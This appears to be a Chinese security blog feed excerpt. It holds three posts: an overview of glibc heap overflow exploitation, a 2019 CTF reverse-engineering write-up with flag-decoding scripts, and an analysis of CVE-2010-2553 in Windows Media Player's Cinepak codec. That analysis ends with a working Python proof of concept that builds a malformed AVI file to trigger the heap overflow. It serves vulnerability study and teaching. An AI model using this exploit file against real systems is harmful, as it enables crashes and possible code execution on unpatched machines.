    <content type="html"><![CDATA[<h1 id="堆溢出-基本方法"><a href="#堆溢出-基本方法" class="headerlink" title="堆溢出-基本方法"></a>堆溢出-基本方法</h1><p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（<strong>之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数</strong>），因而导致了数据溢出，并覆盖到<strong>物理相邻的高地址</strong>的下一个堆块。</p><p>堆溢出漏洞发生的基本前提是</p><ul><li>程序向堆上写入数据。</li><li>写入的数据大小没有被良好地控制。</li></ul><h2 id="堆溢出的利用策略"><a href="#堆溢出的利用策略" class="headerlink" title="堆溢出的利用策略"></a>堆溢出的利用策略</h2><ol><li>覆盖与其<strong>物理相邻的下一个 chunk</strong>的内容。<ul><li>prev_size</li><li>size，主要有三个比特位，以及该堆块真正的大小。<ul><li>NON_MAIN_ARENA</li><li>IS_MAPPED</li><li>PREV_INUSE</li><li>the True chunk size</li></ul></li><li>chunk content，从而改变程序固有的执行流。</li></ul></li><li>利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。</li></ol><h2 id="重要步骤"><a href="#重要步骤" class="headerlink" title="重要步骤"></a>重要步骤</h2><h3 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h3><p>通常来说堆是通过调用 glibc 函数 malloc 进行分配的，在某些情况下会使用 calloc 分配。calloc 与 malloc 的区别是 <strong>calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的</strong>。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">calloc(0x20);</span><br><span class="line">&#x2F;&#x2F;等同于</span><br><span class="line">ptr&#x3D;malloc(0x20);</span><br><span class="line">memset(ptr,0,0x20);</span><br></pre></td></tr></table></figure></div><p>除此之外，还有一种分配是经由 realloc 进行的，realloc 函数可以身兼 malloc 和 free 两个函数的功能。</p><ul><li>当 realloc(ptr,size) 的 size 不等于 ptr 的 size 时<ul><li>如果申请 size &gt; 原来 size<ul><li>如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小</li><li>如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size)</li></ul></li><li>如果申请 size &lt; 原来 size<ul><li>如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变</li><li>如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分</li></ul></li></ul></li><li>当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)</li><li>当 realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作</li></ul><h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>常见的危险函数如下</p><ul><li>输入<ul><li>gets，直接读取一行，忽略 <code>&#39;\x00&#39;</code></li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到 <code>&#39;\x00&#39;</code> 停止</li><li>strcat，字符串拼接，遇到 <code>&#39;\x00&#39;</code> 停止</li><li>bcopy</li></ul></li></ul><h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>计算<strong>开始写入的地址与所要覆盖的地址之间的距离</strong>。 </p><p>一个常见的误区是 malloc 的参数等于实际分配堆块的大小，但是事实上 ptmalloc 分配出来的大小是对齐的。这个长度一般是字长的 2 倍，比如 32 位系统是 8 个字节，64 位系统是 16 个字节。但是对于不大于 2 倍字长的请求，malloc 会直接返回 2 倍字长的块也就是最小 chunk，比如 64 位系统执行<code>malloc(0)</code>会返回用户区域为 16 字节的块。</p><p>注意用户区域的大小不等于 chunk_hear.size，chunk_hear.size = 用户区域大小 + 2 * 字长</p><p>用户申请的内存大小会被修改，其有可能会使用与其物理相邻的下一个 chunk 的 prev_size 字段储存内容。</p><p><strong>实际上 ptmalloc 分配内存是以双字为基本单位，以 64 位系统为例，分配出来的空间是 16 的整数倍，即用户申请的 chunk 都是 16 字节对齐的。</strong></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;堆溢出-基本方法&quot;&gt;&lt;a href=&quot;#堆溢出-基本方法&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>2019科成安洵杯WP</title>
    <link href="https://kabeor.github.io/2019%E7%A7%91%E6%88%90%E5%AE%89%E6%B4%B5%E6%9D%AFWP/"/>
    <id>https://kabeor.github.io/2019%E7%A7%91%E6%88%90%E5%AE%89%E6%B4%B5%E6%9D%AFWP/</id>
    <published>2019-12-30T16:00:00.000Z</published>
    <updated>2020-03-16T04:53:47.571Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2019科成安洵杯WP"><a href="#2019科成安洵杯WP" class="headerlink" title="2019科成安洵杯WP"></a>2019科成安洵杯WP</h1><h1 id="ez"><a href="#ez" class="headerlink" title="ez"></a>ez</h1><p>搜索flag就出来了<br><a href="https://i.loli.net/2019/11/20/8laBfNXRCobYspG.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/11/20/8laBfNXRCobYspG.png" class="lazyload"></a><br><a href="https://i.loli.net/2019/11/20/hoZFP4J9qlAzRyS.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/11/20/hoZFP4J9qlAzRyS.png" class="lazyload"></a></p><h1 id="小游戏"><a href="#小游戏" class="headerlink" title="小游戏"></a>小游戏</h1><p>以前一道题改的，直接定位关键函数<br><a href="https://i.loli.net/2019/11/20/8udQ9FzVRr1S5jq.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/11/20/8udQ9FzVRr1S5jq.png" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">box1&#x3D;[18,64,98,5,2,4,6,3,6,48,49,65,32,12,48,65,31,78,62,32,49,32,1,57,96,3,21,9,4,62,3,5,4,1,2,3,44,65,78,32,16,97,54,16,44,52,32,64,89,45,32,65,15,34,18,16,0]</span><br><span class="line"></span><br><span class="line">box2&#x3D;[123,32,18,98,119,108,65,41,124,80,125,38,124,111,74,49,83,108,94,108,84,6,96,83,44,121,104,110,32,95,117,101,99,123,127,119,96,48,107,71,92,29,81,107,90,85,64,12,43,76,86,13,114,1,117,126,0]</span><br><span class="line">flag&#x3D;list(range(57))</span><br><span class="line"></span><br><span class="line">for i in range(57):</span><br><span class="line">    flag[i]&#x3D;box1[i]^box2[i]^0x14</span><br><span class="line">    print(chr(flag[i]),end&#x3D;&quot;&quot;)  </span><br><span class="line"></span><br><span class="line"># flag&#123;&#125;tdsa|S&gt;ntXsHwndX6tXq2u~Xnis0ubtsni&#96;Xe1sXhsobutXfubXi7sz&#125;</span><br></pre></td></tr></table></figure></div><h1 id="我要vip"><a href="#我要vip" class="headerlink" title="我要vip"></a>我要vip</h1><p>Android Killer修改switch强行进入vip函数即可</p><p>goto :pswitch_1<br><a href="https://i.loli.net/2019/11/20/nUPVKgELDdjs1I8.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/11/20/nUPVKgELDdjs1I8.png" class="lazyload"></a></p><p>flag{czADA_SA_ddad_aijdA}</p><h1 id="不知道什么算法"><a href="#不知道什么算法" class="headerlink" title="不知道什么算法"></a>不知道什么算法</h1><p>触法异常进入success函数，看到div可以确定是除0异常<br><a href="https://i.loli.net/2019/11/20/l4gAMZ37vVibqjo.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/11/20/l4gAMZ37vVibqjo.png" class="lazyload"></a></p><p>40135A除零异常<br>输入必须等于pop eax = 401353</p><p>flag{401353}</p><h1 id="一个简单的cm"><a href="#一个简单的cm" class="headerlink" title="一个简单的cm"></a>一个简单的cm</h1><p>Upack壳，脱壳机脱不干净，esp定律完事</p><p><a href="https://i.loli.net/2019/11/20/id6ah5BjsfOnoJu.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/11/20/id6ah5BjsfOnoJu.png" class="lazyload"></a></p><p>逻辑比较简单，逆回去即可</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># OEP 401ffc</span><br><span class="line"></span><br><span class="line">str1 &#x3D; list(&quot;UESTCDCTF2019JustForhappy&quot;)</span><br><span class="line"></span><br><span class="line">box &#x3D; list(&quot;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&quot;)</span><br><span class="line"></span><br><span class="line">key &#x3D; list(range(len(str1)))</span><br><span class="line"></span><br><span class="line">for i in range(len(str1)):</span><br><span class="line">key[i]&#x3D;box.index(str1[i])</span><br><span class="line">print(key[i],end&#x3D;&#39;,&#39;)</span><br><span class="line"></span><br><span class="line">k&#x3D;[]</span><br><span class="line">k&#x3D;key</span><br><span class="line"></span><br><span class="line">for i in range(len(key)):</span><br><span class="line">if k[i]&gt;&#x3D;0 and k[i]&lt;&#x3D;9:</span><br><span class="line">k[i]&#x3D;k[i]+48</span><br><span class="line">elif k[i]&gt;&#x3D;36 and k[i]&lt;&#x3D;64:</span><br><span class="line">k[i]&#x3D;k[i]+29</span><br><span class="line">elif k[i]&gt;&#x3D;10 and k[i]&lt;&#x3D;35:</span><br><span class="line">k[i]&#x3D;k[i]+87</span><br><span class="line">print(&quot;flag&#123;&quot;,chr(key[i]),&quot;&#125;&quot;,end&#x3D;&quot;&quot;)</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;2019科成安洵杯WP&quot;&gt;&lt;a href=&quot;#2019科成安洵杯WP&quot; class=&quot;headerlink&quot; title=&quot;2019科成安洵杯WP&quot;&gt;&lt;/a&gt;2019科成安洵杯WP&lt;/h1&gt;&lt;h1 id=&quot;ez&quot;&gt;&lt;a href=&quot;#ez&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向， CTF" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8C-CTF/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2010-2553 CVDecompress堆溢出分析</title>
    <link href="https://kabeor.github.io/CVE-2010-2553%20CVDecompress%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/"/>
    <id>https://kabeor.github.io/CVE-2010-2553%20CVDecompress%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/</id>
    <published>2019-12-30T16:00:00.000Z</published>
    <updated>2020-03-16T04:40:13.664Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2010-2553-CVDecompress堆溢出分析"><a href="#CVE-2010-2553-CVDecompress堆溢出分析" class="headerlink" title="CVE-2010-2553 CVDecompress堆溢出分析"></a>CVE-2010-2553 CVDecompress堆溢出分析</h1><h2 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h2><blockquote><p>Windows XP SP3 x86<br>Windbg 6.12.2.633<br>Windows Media Player 9.0.0.4503</p></blockquote><h3 id="Windbg符号表配置"><a href="#Windbg符号表配置" class="headerlink" title="Windbg符号表配置"></a>Windbg符号表配置</h3><p><a href="https://i.loli.net/2019/12/28/QHNyEZL9nvK7itO.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/12/28/QHNyEZL9nvK7itO.png" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">srv*c:\Symbols*http:&#x2F;&#x2F;msdl.microsoft.com&#x2F;download&#x2F;symbols</span><br></pre></td></tr></table></figure></div><p>微软Win7以后使用在线下载符号表机制，XP没有支持，所以只能从网上下载符号表离线包，但还是有些报错，可以复制报错路径，在c:\Symbols中创建该路径，然后将对应dll(C:\WINDOWS\Symbols\dll中)复制过来，如图<br><a href="https://i.loli.net/2019/12/28/q82lfNQ7aLEvsdP.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/12/28/q82lfNQ7aLEvsdP.png" class="lazyload"></a></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>运行Media Player，windbg附加wmplayer.exe</p><h3 id="定位漏洞位置"><a href="#定位漏洞位置" class="headerlink" title="定位漏洞位置"></a>定位漏洞位置</h3><p>windbg下的gflags.exe可以辅助堆调试</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">调试选项</span><br><span class="line"></span><br><span class="line">htc-堆尾检查，在堆块末尾附加额外的标记信息（通常为8字节），用于检查堆块是否发生溢出。</span><br><span class="line">hfc-堆释放检查，在释放堆块时对堆进行各种检查，防止多次释放同一个堆块。</span><br><span class="line">hpc-堆参数检查，对传递给堆管理的参数进行更多的检查。</span><br><span class="line">ust-用户态栈回溯，即将每次调用堆函数的函数调用信息记录到一个数据库中。</span><br><span class="line">htg-堆标志，为堆块增加附加标记，以记录堆块的使用情况或其他信息。</span><br><span class="line">hvc-调用时验证，即每次调用堆函数时都对整个堆进行验证和检查。</span><br><span class="line">hpa-启用页堆，在堆块后增加专门用于检测溢出的栅栏页，若发生堆溢出触及栅栏页便会立刻触发异常。</span><br></pre></td></tr></table></figure></div><p>windbg中使用!gflag +hpa启用页堆检测<br>g继续运行程序，运行poc.avi<br>触发异常，kb显示调用栈<br><a href="https://i.loli.net/2019/12/28/wegijKQWNkElnHI.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/12/28/wegijKQWNkElnHI.png" class="lazyload"></a></p><p>ub查看反汇编，进入73b721ae产生异常，因此在73b7cbee处下断点<br><a href="https://i.loli.net/2019/12/28/mhGurxMwElo9YQd.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/12/28/mhGurxMwElo9YQd.png" class="lazyload"></a></p><p>但如果直接下断点到73b7cbee不成功，因为该地址位于iccvid.dll模块中，而iccvid只在解析poc.avi时才会被动态加载，若重新附加进程运行，里面是没有iccvid.dl模块的。</p><p><strong>解决方法：在刚刚附加上进程时，通过”sxe ld:iccvid”命令，设置在iccvid.dll模块首次加载时断下</strong></p><p>重新加载，使用sxe ld:iccvid加载iccvid.dll模块并断下,g继续运行<br>播放poc.avi, lmm iccvid查看模块信息<br>bp下断<br>bl可看出模块列表<br>运行即可到达该断点位置</p><p><a href="https://i.loli.net/2019/12/28/DQUTP4BYCsOkHXx.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/12/28/DQUTP4BYCsOkHXx.png" class="lazyload"></a></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>IDA分析iccvid.dll,并导入pdb，发现该漏洞位于__stdcall CVDecompress(x, x, x, x, x, x, x)函数中</p><p><a href="https://i.loli.net/2019/12/28/DWwT4rHdMLzCUO5.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/12/28/DWwT4rHdMLzCUO5.png" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">x86asm</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span>73B721E1 loc_73B721E1:                           <span class="comment">; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+15↑j</span></span><br><span class="line"><span class="symbol">.text:</span>73B721E1                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B721E3                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_8], <span class="number">20h</span></span><br><span class="line"><span class="symbol">.text:</span>73B721E7                 <span class="keyword">jb</span>      loc_73B723ED</span><br><span class="line"><span class="symbol">.text:</span>73B721ED                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+arg_4]</span><br><span class="line"><span class="symbol">.text:</span>73B721F0                 <span class="keyword">mov</span>     <span class="number">ah</span>, [<span class="built_in">esi</span>+<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B721F3                 <span class="keyword">movzx</span>   <span class="built_in">ecx</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">3</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B721F7                 <span class="keyword">mov</span>     <span class="built_in">al</span>, [<span class="built_in">esi</span>+<span class="number">2</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B721FA                 <span class="keyword">shl</span>     <span class="built_in">eax</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span>73B721FD                 <span class="keyword">or</span>      <span class="built_in">eax</span>, <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>73B721FF                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_8], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B72202                 <span class="keyword">jl</span>      loc_73B723F4</span><br><span class="line"><span class="symbol">.text:</span>73B72208                 <span class="keyword">mov</span>     <span class="built_in">cl</span>, [<span class="built_in">esi</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B7220A                 <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+arg_8+<span class="number">3</span>], <span class="built_in">cl</span></span><br><span class="line"><span class="symbol">.text:</span>73B7220D                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_10]</span><br><span class="line"><span class="symbol">.text:</span>73B72210                 <span class="keyword">push</span>    <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>73B72211                 <span class="keyword">push</span>    <span class="number">0Ah</span></span><br><span class="line"><span class="symbol">.text:</span>73B72213                 <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B72214                 <span class="keyword">call</span>    _ULongSub@<span class="number">12</span>    <span class="comment">; ULongSub(x,x,x)</span></span><br><span class="line"><span class="symbol">.text:</span>73B72219                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B7221B                 <span class="keyword">jl</span>      loc_73B723F4</span><br><span class="line"><span class="symbol">.text:</span>73B72221                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B72223                 <span class="keyword">mov</span>     <span class="number">ah</span>, [<span class="built_in">esi</span>+<span class="number">8</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B72226                 <span class="keyword">add</span>     <span class="built_in">esi</span>, <span class="number">0Ah</span></span><br><span class="line"><span class="symbol">.text:</span>73B72229                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_14], <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>73B7222C                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_18], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>73B7222F                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_C], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>73B72232                 <span class="keyword">mov</span>     <span class="built_in">al</span>, [<span class="built_in">esi</span>-<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span>73B72235                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>73B72237                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_1C], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B7223A                 <span class="keyword">jle</span>     loc_73B723EA</span><br><span class="line"><span class="symbol">.text:</span>73B72240                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_4], <span class="built_in">edi</span></span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2019/12/28/vjZzI4Kbo7JH9qh.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/12/28/vjZzI4Kbo7JH9qh.png" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cinepak_codec_data1 &#x3D; &#39;\x00\x00\x00\x68\x01\x60\x01\x20&#39;</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2019/12/28/27fA1yahwgdWtRu.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/12/28/27fA1yahwgdWtRu.png" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">x86asm</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span>73B72226                 <span class="keyword">add</span>     <span class="built_in">esi</span>, <span class="number">0Ah</span>  <span class="comment">;esi指向cinepak_codec_data2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cinepak_codec_data2 = <span class="string">'\x10\x00\x00\x10\x00\x00\x00\x00\x00\x60\x01\x60\x20\x00\x00\x00\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x00'</span></span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">x86asm</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span>73B72246                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="number">16h</span>  <span class="comment">;判断未解压缩数据是否大于等于0x16</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.text:</span>73B722A9                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_4]  <span class="comment">;首次为0，循环递增到0x2000</span></span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2019/12/28/dzRLiMa4jB6PqcH.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/12/28/dzRLiMa4jB6PqcH.png" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">x86asm</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span>73B723B9 loc_73B723B9:                           <span class="comment">; CODE XREF: CVDecompress(x,x,x,x,x,x,x)+15A↑j</span></span><br><span class="line"><span class="symbol">.text:</span>73B723B9                 <span class="keyword">movsx</span>   <span class="built_in">eax</span>, <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+arg_4]</span><br><span class="line"><span class="symbol">.text:</span>73B723BD                 <span class="keyword">imul</span>    <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_18]</span><br><span class="line"><span class="symbol">.text:</span>73B723C1                 <span class="keyword">add</span>     [<span class="built_in">ebp</span>+arg_14], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>73B723C4                 <span class="keyword">inc</span>     [<span class="built_in">ebp</span>+var_14]</span><br><span class="line"><span class="symbol">.text:</span>73B723C7                 <span class="keyword">add</span>     [<span class="built_in">ebp</span>+var_4], <span class="number">2000h</span></span><br><span class="line"><span class="symbol">.text:</span>73B723CE                 <span class="keyword">xor</span>     <span class="built_in">edi</span>, <span class="built_in">edi</span></span><br></pre></td></tr></table></figure></div><p>每次循环复制0x800字节数据，目标地址递增0x2000，堆块大小为0x6000，令0x1100的数据块超过三个就能造成堆溢出。</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">aviHeaders = <span class="string">'\x52\x49\x46\x46\x58\x01\x00\x00\x41\x56\x49\x20\x4C\x49\x53\x54\xC8\x00\x00\x00\x68\x64\x72\x6C\x61\x76\x69\x68\x38\x00\x00\x00\xA0\x86\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x01\x00\x00\x4E\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x60\x01\x00\x00\x20\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4C\x49\x53\x54\x7C\x00\x00\x00\x73\x74\x72\x6C\x73\x74\x72\x68\x38\x00\x00\x00\x76\x69\x64\x73\x63\x76\x69\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE8\x03\x00\x00\x10\x27\x00\x00\x00\x00\x00\x00\x4E\x00\x00\x00\x20\x74\x00\x00\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x60\x01\x20\x01\x73\x74\x72\x66\x28\x00\x00\x00\x28\x00\x00\x00\x50\x01\x00\x00\x20\x01\x00\x00\x01\x00\x18\x00\x63\x76\x69\x64\x84\x8D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">padding = <span class="string">'\x4A\x55\x4E\x4B\x00\x00\x00\x00\x4A\x55\x4E\x4B\x00\x00\x00\x00'</span></span><br><span class="line">movi_tag = <span class="string">'\x4C\x49\x53\x54\x5C\x00\x00\x00\x6D\x6F\x76\x69\x30\x30\x64\x63\x10\x00\x00\x00'</span></span><br><span class="line">cinepak_codec_data1 = <span class="string">'\x00\x00\x00\x68\x01\x60\x01\x20'</span></span><br><span class="line">number_of_coded_strips = <span class="string">'\x00\x10'</span> </span><br><span class="line">cinepak_codec_data2 = <span class="string">'\x10\x00\x00\x10\x00\x00\x00\x00\x00\x60\x01\x60\x20\x00\x00\x00\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x00'</span></span><br><span class="line">idx_tag = <span class="string">'\x69\x64\x78\x31\x10\x00\x00\x00\x30\x30\x64\x63\x10\x00\x00\x00\x04\x00\x00\x00\x68\x00\x00\x00'</span></span><br><span class="line"></span><br><span class="line">avifile = open(<span class="string">'poc.avi'</span>, <span class="string">'wb+'</span>)</span><br><span class="line">avifile.write(aviHeaders)</span><br><span class="line">avifile.write(padding)</span><br><span class="line">avifile.write(movi_tag)</span><br><span class="line">avifile.write(cinepak_codec_data1)</span><br><span class="line">avifile.write(number_of_coded_strips)</span><br><span class="line">avifile.write(cinepak_codec_data2)</span><br><span class="line">avifile.write(idx_tag)</span><br><span class="line"></span><br><span class="line">avifile.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[-] AVI file generated'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
